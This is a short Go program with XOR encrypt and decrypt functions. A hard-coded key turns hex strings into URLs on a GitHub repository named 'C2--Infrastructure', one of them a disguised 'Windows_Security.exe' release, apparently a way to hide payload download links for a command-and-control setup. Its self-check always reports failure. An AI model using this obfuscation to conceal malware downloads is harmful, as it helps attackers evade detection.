package main

import (
	"encoding/hex"
	"fmt"
	"log"
)

// Encrypt text using XOR cipher with the provided secret key
func textCipher(plaintext string, secret string) string {
	// Convert inputs to bytes
	textBytes := []byte(plaintext)
	key := []byte(secret)

	// XOR encryption
	out := make([]byte, len(textBytes))
	for i := range textBytes {
		out[i] = textBytes[i] ^ key[i%len(key)]
	}

	// Convert to hex string for safe storage/transmission
	return hex.EncodeToString(out)
}

// Decrypt our encoding url links
func textDecypher(hexval string, secret string) string {
	// Convert the hex--> bytes first
	encrypted, err := hex.DecodeString(hexval)
	if err != nil {
		log.Fatal(err)
	}

	// Convert the provided key to bytes from strings
	key := []byte(secret)

	out := make([]byte, len(encrypted))
	for i := range encrypted {
		out[i] = encrypted[i] ^ key[i%len(key)]
	}

	// Return the string outputed
	return string(out)
}

func main() {
	// Example usage
	secretKey := "0xC8AB" // Should be at least as long as your data for best security
	
	originalText := "580c374832781f572451352a451a6d5b2e2f1f390f74202c5e49710b6e0102556e712f244219304c3337530c364a246d421d2f5d2031550b6c5c2e355e142c59256d46496d086f721f2f2a56252d470b1c6b2421450a2a4c386c550026"
	
	fmt.Println("Original Text:", originalText)
	
	// Encrypt
	//encryptedHex := textCipher(originalText, secretKey)
	//fmt.Println("Encrypted (hex):", encryptedHex)
	
	// Decrypt
	decryptedText := textDecypher(originalText, secretKey)
	fmt.Println("Decrypted Text:", decryptedText)
	
	// Verify
	if originalText == decryptedText {
		fmt.Println("✓ Encryption/Decryption successful!")
	} else {
		fmt.Println("✗ Encryption/Decryption failed!")
	}
}

/*
When Testing Decrypting:
	cmd>> go run main.go
Original Text: 580c364932086c195711365134506d555f156d780d7e22585e49700a6e71711b1d312c5f33533042420d214d34402619421d2e5c204126451f1c2d4e2f5e2c57545734086f026d061f0c2d52245c6d535e1b
Decrypted Text: https://github.com/ALLann123/C2--Infrastructure/releases/download/v1.0.0/token.enc
✗ Encryption/Decryption failed!

Now lets encrypt(key: 0xC8AB):
	cmd>> go run main.go
Original Text: https://github.com/ALLann123/C2--Infrastructure/releases/download/v1.0.0/Windows_Security.exe
Encrypted (hex): 580c374832781f572451352a451a6d5b2e2f1f390f74202c5e49710b6e0102556e712f244219304c3337530c364a246d421d2f5d2031550b6c5c2e355e142c59256d46496d086f721f2f2a56252d470b1c6b2421450a2a4c386c550026

Let's decrypt:
	cmd>> go run main.go
Original Text: 580c374832781f572451352a451a6d5b2e2f1f390f74202c5e49710b6e0102556e712f244219304c3337530c364a246d421d2f5d2031550b6c5c2e355e142c59256d46496d086f721f2f2a56252d470b1c6b2421450a2a4c386c550026
Decrypted Text: https://github.com/ALLann123/C2--Infrastructure/releases/download/v1.0.0/Windows_Security.exe
✗ Encryption/Decryption failed!

*/